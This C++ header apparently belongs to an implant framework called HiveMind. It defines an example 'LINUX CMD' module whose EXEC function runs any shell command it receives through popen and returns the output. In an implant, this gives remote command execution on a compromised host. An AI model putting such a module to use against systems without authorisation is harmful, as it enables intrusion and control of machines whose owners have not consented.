/** @file linux_cmd.hpp
* @brief Contains implementation for the linux cmd module
* @author Im_Adriano
*/
#ifndef HIVEMIND_IMPLANTFRAMEWORK_LIB_SOURCE_MODULES_LINUX_CMD_HPP_
#define HIVEMIND_IMPLANTFRAMEWORK_LIB_SOURCE_MODULES_LINUX_CMD_HPP_
#include <cstdio>
#include <iostream>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>

#include "module.hpp"
#include "module_factory.hpp"

namespace hivemind_lib {
/**
 * @brief Struct for the parsing arguments to this module.
 */
struct CmdArgParse {
  std::string cmd{};
};

/**
 * @brief An Example module to show people how to make one.
 */
class LinuxCmdModule : public Module {
 public:
  ModuleInfo Init() override{
    // Create this struct to describe a function in your module. One for each exported function.
    struct ModuleFuncInfo module_func_info;
    // Fill in the struct. One for each exported function.
    module_func_info.param_names.emplace_back("cmd");
    module_func_info.param_types.emplace_back("String");
    module_func_info.module_func_name = "EXEC";
    module_func_info.module_func_desc = "Function to run command in linux shell";
    module_func_info.param_num = 1;

    // Fill in this struct to describe your module.
    this->mod_info_.module_funcs.push_back(module_func_info);
    this->mod_info_.module_name = "LINUX CMD";
    this->mod_info_.module_desc = "A module to run cmd commands";

    // Setup the safe pointer to all of your exported functions.
    // All functions are of this type and take a single argument (the placeholder)
    std::function<std::string(std::string)> f = std::bind(&LinuxCmdModule::Exec, this, std::placeholders::_1);

    // Place the function in the function map.
    this->func_map_.insert({"EXEC", f});
    this->timeout_map_.insert({"EXEC", 60}); // In seconds

    // Always return this
    return this->mod_info_;
  }

  // An example function, all functions need to only take in a string
  std::string Exec(std::string json) {
    auto args = ParseData<CmdArgParse>(std::move(json));
    std::array<char, 128> buffer{};
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(args.cmd.c_str(), "r"), pclose);
    if (!pipe) {
      return "Popen Error";
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
      result += buffer.data();
    }
    return result;
  }

  LinuxCmdModule() = default;
};

// Required for the system to be able to use your module. Registers it in the global module factory.
REGISTER_MODULE_FACTORY(LinuxCmdModule, "CmdModule");

// Required to setup parsing of json into your struct. Name of the struct first then all it's members in order.
NLOHMANN_DEFINE_TYPE_NON_INTRUSIVE(CmdArgParse, cmd);

}
#endif